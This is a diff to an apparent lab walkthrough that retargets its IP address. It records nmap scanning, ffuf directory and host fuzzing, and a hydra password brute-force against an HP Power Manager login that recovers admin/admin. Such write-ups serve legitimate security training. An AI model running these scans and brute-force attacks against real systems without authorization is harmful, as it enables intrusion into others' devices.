@@ -1,20 +1,20 @@
-# target: 192.168.69.45
+# target: 192.168.161.45
 
 # reconnaissance
 
 ```bash
-nmap 192.168.69.45 -p- --open -Pn -O -sV -sC -oN nmap.txt
+nmap 192.168.161.45 -p- --open -Pn -O -sV -sC -oN nmap.txt
 ```
 
 ```
 Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-14 07:41 +0000
-Nmap scan report for 192.168.69.45
+Nmap scan report for 192.168.161.45
 Host is up (0.00042s latency).
 Not shown: 54466 closed tcp ports (reset), 11057 filtered tcp ports (no-response)
 Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
 PORT      STATE SERVICE      VERSION
 80/tcp    open  http         GoAhead WebServer
-|_http-title: Did not follow redirect to http://192.168.69.45/index.asp
+|_http-title: Did not follow redirect to http://192.168.161.45/index.asp
 |_http-server-header: GoAhead-Webs
 135/tcp   open  msrpc        Microsoft Windows RPC
 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
@@ -83,7 +83,7 @@ Nmap done: 1 IP address (1 host up) scanned in 118.96 seconds
 ```
 
 ```bash
-ffuf -u http://192.168.69.45:80/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt
+ffuf -u http://192.168.161.45:80/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt
 ```
 
 ```txt
@@ -100,7 +100,7 @@ ffuf -u http://192.168.69.45:80/FUZZ -w /usr/share/seclists/Discovery/Web-Conten
 ________________________________________________
 
  :: Method           : GET
- :: URL              : http://192.168.69.45:80/FUZZ
+ :: URL              : http://192.168.161.45:80/FUZZ
  :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
  :: Follow redirects : false
  :: Calibration      : false
@@ -125,7 +125,7 @@ nul                     [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1ms
 ## subdoamin
 
 ```bash
-ffuf -u http://192.168.69.45:80 -H "Host:FUZZ.192.168.69.45" -w /usr/share/seclists/Discovery/DNS/namelist.txt -fc 302
+ffuf -u http://192.168.161.45:80 -H "Host:FUZZ.192.168.161.45" -w /usr/share/seclists/Discovery/DNS/namelist.txt -fc 302
 ```
 
 ```txt
@@ -142,9 +142,9 @@ ffuf -u http://192.168.69.45:80 -H "Host:FUZZ.192.168.69.45" -w /usr/share/secli
 ________________________________________________
 
  :: Method           : GET
- :: URL              : http://192.168.69.45:80
+ :: URL              : http://192.168.161.45:80
  :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
- :: Header           : Host: FUZZ.192.168.69.45
+ :: Header           : Host: FUZZ.192.168.161.45
  :: Follow redirects : false
  :: Calibration      : false
  :: Timeout          : 10
@@ -157,7 +157,7 @@ ________________________________________________
 
 ```
 
-> http://192.168.69.45/index.asp
+> http://192.168.161.45/index.asp
 > HP Power Manager login page
 
 ![](image.png)
@@ -168,16 +168,16 @@ ________________________________________________
 
 ```txt
 POST /goform/formLogin HTTP/1.1
-Host: 192.168.69.45
+Host: 192.168.161.45
 Content-Length: 68
 Cache-Control: max-age=0
 Accept-Language: en-US,en;q=0.9
 Upgrade-Insecure-Requests: 1
 Content-Type: application/x-www-form-urlencoded
 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
-Origin: http://192.168.69.45
+Origin: http://192.168.161.45
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: http://192.168.69.45/index.asp
+Referer: http://192.168.161.45/index.asp
 Accept-Encoding: gzip, deflate, br
 Connection: keep-alive
 
@@ -185,11 +185,11 @@ HtmlOnly=true&Login=admin&Password=password&loginButton=Submit+Login
 ```
 
 ```bash
-sudo hydra -L /usr/share/seclists/Usernames/cirt-default-usernames.txt -P /usr/share/wordlists/rockyou.txt 192.168.69.45 http-post-form "/goform/formLogin:HtmlOnly=true&Login=^USER^&Password=^PASS^&loginButton=Submit+Login:Invalid"
+sudo hydra -V -F -L /usr/share/seclists/Usernames/cirt-default-usernames.txt -P /usr/share/wordlists/rockyou.txt 192.168.161.45 http-post-form "/goform/formLogin:HtmlOnly=true&Login=^USER^&Password=^PASS^&loginButton=Submit+Login:Invalid"
 ```
 
 > admin/admin
-> http://192.168.69.45/Contents/index.asp
+> http://192.168.161.45/Contents/index.asp
 
 ![](image_2.png)
 
